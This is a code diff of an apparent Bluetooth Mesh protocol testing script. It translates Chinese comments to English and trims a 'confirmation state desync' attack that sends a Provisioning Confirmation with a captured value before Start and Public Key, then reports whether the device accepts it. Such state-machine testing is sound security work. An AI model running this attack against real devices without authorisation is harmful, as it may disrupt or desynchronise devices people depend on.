@@ -30,8 +30,8 @@ algorithm = config.device["algorithm"]
 
 def create_confirmation_with_value(blemesh_sul, confirmation_value: bytes):
     """
-    创建指定 Confirmation 值的 Provisioning Confirmation 消息（支持分段）
-    从 packet_construction 获取原始 confirmation 分段，按传入的 confirmation_value 覆盖
+    create Provisioning Confirmation message with specified Confirmation value（support fragmentation）
+    get original confirmation fragments from packet_construction, overwrite with the specified confirmation_value
     """
     pkt = blemesh_sul.packet_construction.pbadv.PROVISIONING_CONFIRMATION()
     pkt["Provisioning_Confirmation"].Confirmation = confirmation_value
@@ -42,63 +42,10 @@ def create_confirmation_with_value(blemesh_sul, confirmation_value: bytes):
 
 
 def confirmation_state_desync_attack(blemesh_sul):
-    """
-    CONFIRMATION-STATE-DESYNC-02 攻击测试
-    通过在错误状态下发送 Confirmation 来测试状态去同步
     
-    攻击场景：
-    1. 在未完成 Public Key 交换时发送 Confirmation
-    2. 跳过 Public Key 直接发送 Confirmation
-    3. 测试设备是否严格限制状态转换顺序
     
-    可能导致的问题：
-    - DoS
-    - 未定义的认证行为
-    
-    观察信号：
-    - 在公钥之前接受 Confirmation
-    - 日志中观察到状态跳转
-    """
-    # print(Fore.YELLOW + "=" * 80)
-    # print(Fore.YELLOW + "[攻击测试] CONFIRMATION-STATE-DESYNC-02: Confirmation 状态去同步攻击")
-    # print(Fore.YELLOW + "=" * 80)
-    # print()
-    
-    # # ========== 测试用例: 在错误状态下发送 Confirmation ==========
-    # print(Fore.RED + "[测试用例] 在错误状态下发送 Confirmation（状态去同步测试）")
-    # print(Fore.RED + "目标：测试设备是否严格限制协议状态序列")
-    # print()
-    
-    # # 步骤1: 攻击 - 跳过 Public Key，直接发送 Confirmation
-    # print(Fore.RED + "步骤1: 攻击 - 跳过 Public Key，直接发送 Confirmation")
-    # print(Fore.RED + "  ⚠ 这是攻击步骤：在未完成 Public Key 交换时发送 Confirmation")
-    # print()
-    
-    # # 建立链接
-    # print(Fore.CYAN + "  建立 Link Open...")
-    # link_open_pkt = blemesh_sul.get_pkt("link_open_message_pkt")
-    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=link_open_pkt)
-    # print(Fore.GREEN + "    ✓ Link Open 已发送")
-    # print()
-    
-    # invite_pkt = blemesh_sul.get_pkt("provisioning_invite_pkt")
-    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=invite_pkt)
-    # print(Fore.GREEN + "    ✓ Invite 已发送")
 
-    
-    # capabilities_pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
-    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=capabilities_pkt)
-    # print(Fore.GREEN + "    ✓ Transaction Acknowledgment 已发送")
-
-    
-    # start_pkt = blemesh_sul.get_pkt("provisioning_start_pkt")
-    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=start_pkt)
-    # print(Fore.GREEN + "    ✓ Start 已发送")
-
-    
-    
-    # # 跳过 Public Key，直接发送 Confirmation
-    print(Fore.CYAN + "  跳过 Public Key，直接发送 Confirmation（错误状态）...", end=" ... ")  
+  
     captured_confirmation = bytes.fromhex(
         "e6e7311582b93e8a252c7587d8941ddd61cbbd4437637e18d2472c168ecbfe2c"
     )
@@ -106,39 +53,11 @@ def confirmation_state_desync_attack(blemesh_sul):
     
 
 
-    # try:
-    #     receive_pkt = blemesh_sul.packet_send_received_control(
-    #         send_pkt=confirmation_pkt
-    #     )
-        
-    #     if receive_pkt and receive_pkt != "empty":
-    #         print(Fore.YELLOW + "⚠ 收到响应")
-    #         print(Fore.YELLOW + f"    -> 响应: {receive_pkt}")
-    #         print(Fore.RED + "    ⚠ 警告: 设备在未完成 Public Key 交换时接受了 Confirmation！")
-    #         print(Fore.RED + "    ⚠ 可能导致状态机错乱或提前进入 Random 校验阶段")
-    #     else:
-    #         print(Fore.GREEN + "✓ 无响应（设备可能正确拒绝了错误状态的 Confirmation）")
-    # except Exception as e:
-    #     print(Fore.RED + f"✗ 异常: {str(e)}")
-    
-    # pkt = blemesh_sul.get_pkt("provisioning_public_key_pkt")
-    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
-    # print(Fore.GREEN + "    ✓ Public Key 已发送")
 
-    # pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
-    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
-    # print(Fore.GREEN + "    ✓ Confirmation 已发送")
-
-    # pkt = blemesh_sul.get_pkt("provisioning_random_pkt")
-    # receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
-    # print(Fore.GREEN + "    ✓ Confirmation 已发送")
-
-
-    # # 步骤3: 攻击 - 在 Start 之前发送 Confirmation
-    print(Fore.RED + "步骤3: 攻击 - 在 Start 之前发送 Confirmation（更早的错误状态）")
+    print(Fore.RED + "step3: attack - send Confirmation（error state）before Start")
     print()
     
-    # 重新建立流程
+    
     # blemesh_sul.pre()
     link_open_pkt3 = blemesh_sul.get_pkt("link_open_message_pkt")
     receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=link_open_pkt3)
@@ -152,8 +71,7 @@ def confirmation_state_desync_attack(blemesh_sul):
     receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=capabilities_pkt3)
  
     
-    # 跳过 Start 和 Public Key，直接发送 Confirmation
-    # print(Fore.CYAN + "  跳过 Start 和 Public Key，直接发送 Confirmation...", end=" ... ")
+
     
     confirmation_pkt3 = create_confirmation_with_value(blemesh_sul, captured_confirmation)
     
@@ -163,13 +81,13 @@ def confirmation_state_desync_attack(blemesh_sul):
         )
         
         if receive_pkt and receive_pkt != "empty":
-            print(Fore.YELLOW + "⚠ 收到响应")
-            print(Fore.YELLOW + f"    -> 响应: {receive_pkt}")
-            print(Fore.RED + "    ⚠ 警告: 设备在非常早的状态接受了 Confirmation！")
+            print(Fore.YELLOW + "⚠ received response")
+            print(Fore.YELLOW + f"    -> response: {receive_pkt}")
+            print(Fore.RED + "    ⚠ warning: the device accepted the Confirmation in a very early state!")
         else:
-            print(Fore.GREEN + "✓ 无响应（设备可能正确拒绝了错误状态的 Confirmation）")
+            print(Fore.GREEN + "✓ no response（the device may have correctly rejected the error state Confirmation）")
     except Exception as e:
-        print(Fore.RED + f"✗ 异常: {str(e)}")
+        print(Fore.RED + f"✗ exception: {str(e)}")
 
 
 
